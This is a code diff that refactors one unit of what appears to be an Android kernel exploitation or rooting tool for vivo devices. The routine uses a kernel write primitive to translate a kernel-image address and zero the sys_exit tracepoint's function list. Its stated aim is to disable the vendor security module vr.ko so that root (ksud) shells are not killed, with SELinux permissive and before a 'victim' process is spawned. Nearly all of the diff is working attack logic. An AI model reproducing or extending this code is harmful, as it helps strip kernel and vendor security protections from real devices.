@@ -4,9 +4,10 @@
  * The plan (`plan_vr_guard` in vr_guard.hpp) turns the caller's View into a
  * write target; this unit carries the parts that need the device: the runtime
  * applicability check and the kernel write itself. Both the write and the
- * image->direct-map translation arrive through `AncillaryOps`, injected by the
- * backend call site, so this module names no backend type and stays within the
- * platform -> {contract, memory, profile, ancillary, support} dependency set.
+ * image->direct-map translation arrive through the injected
+ * `contract::Capabilities` view, so this module names no backend type and
+ * stays within the platform -> {contract, memory, profile, plugin, support}
+ * dependency set.
  */
 
 #ifndef _GNU_SOURCE
@@ -61,11 +62,12 @@ namespace ghostlock::platform::vivo {
         constexpr int32_t kVrGuardAttempts = 5;
     } // namespace
 
-    Status execute_vr_guard(AncillaryStage stage, AncillaryOps &ops,
+    Status execute_vr_guard(PluginStage stage,
+                            const contract::Capabilities &capabilities,
                             const View &view) noexcept {
         /* One stage only: with SELinux permissive and no victim spawned yet, a
          * single write covers every process this run will bring up. */
-        if (stage != AncillaryStage::PreSpawn) return true;
+        if (stage != PluginStage::PreSpawn) return true;
 
         const std::optional<VrGuardPlan> plan = plan_vr_guard(view);
         if (!plan.has_value()) return true; /* view does not carry it */
@@ -74,8 +76,7 @@ namespace ghostlock::platform::vivo {
             pr_info("vr guard: vr.ko not present; nothing to neutralize\n");
             return true;
         }
-        if (!ops.write_available || ops.write_zero == nullptr ||
-            ops.image_to_direct_map == nullptr) {
+        if (capabilities.kernel == nullptr || capabilities.alias == nullptr) {
             pr_warning("vr guard: no write primitive available; vr.ko probe left "
                        "armed (ksud shells may be killed)\n");
             return false;
@@ -83,14 +84,22 @@ namespace ghostlock::platform::vivo {
 
         const uintptr_t image = static_cast<uintptr_t>(
                 memory::KIMAGE_TEXT_BASE + plan->image_offset);
-        const uintptr_t target = ops.image_to_direct_map(image);
+        const contract::CapabilityResult<std::uint64_t> direct =
+                capabilities.alias->to_direct_map(image);
+        if (!direct.has_value()) {
+            pr_warning("vr guard: image->direct-map translation failed (error=%u); "
+                       "vr.ko probe left armed\n",
+                       static_cast<unsigned>(direct.error()));
+            return false;
+        }
+        const uintptr_t target = static_cast<uintptr_t>(direct.value());
         pr_info("vr guard: neutralizing __tracepoint_sys_exit.funcs "
                 "image=%016zx target=%016zx width=%u\n",
                 static_cast<size_t>(image), static_cast<size_t>(target),
                 plan->width_bytes);
 
         for (int32_t attempt = 1; attempt <= kVrGuardAttempts; attempt++) {
-            if (ops.write_zero(target, "vr guard: sys_exit tp->funcs")) {
+            if (capabilities.kernel->write_zero(target)) {
                 pr_success("vr guard: sys_exit probe disabled (attempt %d)\n", attempt);
                 return true;
             }
